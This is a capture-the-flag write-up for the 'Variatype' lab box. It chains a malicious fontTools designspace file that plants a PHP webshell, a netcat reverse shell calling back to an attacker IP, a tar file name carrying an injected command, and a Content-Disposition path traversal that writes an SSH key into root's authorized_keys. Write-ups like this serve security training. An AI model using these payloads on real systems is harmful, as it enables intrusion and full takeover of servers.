# CTF – Variatype (Writeup)

## Context
Variatype is a Debian Linux box hosting "VariaType Labs — Variable Font Generator"
(`portal.variatype.htb`). The site builds variable fonts from an uploaded
`.designspace` file plus source `.ttf` files using fontTools. That build step is
abused for an arbitrary file write, and a root cron job plus a sudo rule finish the
job.

## Recon
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    nginx 1.22.1
|_http-title: VariaType Labs — Variable Font Generator
```

Only SSH and an nginx-served web app. The web app's font-generation feature (which
consumes attacker-supplied `.designspace` XML) is the attack surface.

## Initial access – malicious designspace → PHP webshell (CVE-2025-47273)
The generator compiles a variable font from a `.designspace` describing axes and
sources. Two things in a crafted designspace give code execution:

1. The `<variable-font>` output `filename` is attacker-controlled and accepts an
   absolute path, so the generated file is written wherever I want — here, into the
   web root as a `.php` file:

   ```xml
   <variable-font name="MyFont"
     filename="/var/www/portal.variatype.htb/public/files/shell0.php">
   ```

2. A `<labelname>` carries a PHP payload inside CDATA, which ends up in the written
   file:

   ```xml
   <labelname xml:lang="en"><![CDATA[<?php echo "VULN_OK"; system($_GET['cmd']); die(); ?>]]...><![CDATA[>]]></labelname>
   ```

`setup.py` builds the two placeholder source fonts (`source-light.ttf`,
`source-regular.ttf`) with `fontTools.fontBuilder`, and `malicious.designspace`
references them. Uploading the designspace + fonts produces `shell0.php` in the public
files directory. I then hit the webshell to get a reverse shell:

```
nc -lvnp 4446
curl 'http://portal.variatype.htb/files/shell0.php?cmd=rm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%2010.10.15.101%204446%3E/tmp/f'
```

Shell as `www-data`, then a PTY upgrade:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Lateral movement – tar filename command injection → SUID bash → steve
`pspy64` revealed a privileged scheduled task processing archives dropped in the
public files directory, passing archive member names into a shell. I planted a `.tar`
whose single member name contains a command injection:

```python
import tarfile, io
payload = 'a.ttf;bash /tmp/s.sh;b.ttf'
tar = tarfile.open('/var/www/portal.variatype.htb/public/files/exploit.tar', 'w')
info = tarfile.TarInfo(name=payload)
info.size = 4
tar.addfile(info, io.BytesIO(b'AAAA'))
tar.close()
```

When the task expanded the archive, `bash /tmp/s.sh` ran as the privileged user,
producing a SUID bash I invoked with `-p`:

```
/tmp/bash_s -p
```

That dropped me to `steve`'s context. I then added my SSH key and logged in over SSH
to get a clean `steve` session.

## Privilege escalation – sudo script SSRF + path-traversal file write
`steve` had a sudo rule allowing:

```
sudo /usr/bin/python3 /opt/font-tools/install_validator.py <URL>
```

`install_validator.py` fetches a URL and saves the response using the server-supplied
`Content-Disposition` filename — with no path sanitization. I served my SSH public key
from a small HTTP server whose response sets the filename to a traversal into root's
authorized_keys (`server.py`):

```python
self.send_header('Content-Disposition',
    'attachment; filename="../../../../../root/.ssh/authorized_keys"')
self.wfile.write(PUBKEY)
```

Running the sudo'd validator against it (with `%2f` encoding in the URL path) makes it
write my key as root:

```
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  'http://10.10.15.101:8080/%2froot%2f.ssh%2fauthorized_keys'
```

With my key in `/root/.ssh/authorized_keys`, I SSH'd in as root.

## Conclusion
A malicious `.designspace` let me write a PHP webshell into the web root via the font
generator (CVE-2025-47273), giving a `www-data` shell. A root cron job that untarred
uploads and passed member names to a shell let me inject a command and grab a SUID
bash as `steve`. Finally, a sudo-runnable `install_validator.py` that trusted a remote
`Content-Disposition` filename allowed a path-traversal write of my SSH key into
`/root/.ssh/authorized_keys` for root.

## Skills demonstrated
- Abusing fontTools designspace processing for arbitrary file write (CVE-2025-47273)
- Dropping and triggering a PHP webshell, reverse shell, PTY upgrade
- Using `pspy` to find a privileged scheduled task
- TAR archive member-name command injection → SUID binary
- Exploiting a sudo script's SSRF + `Content-Disposition` path traversal to write into `/root/.ssh`
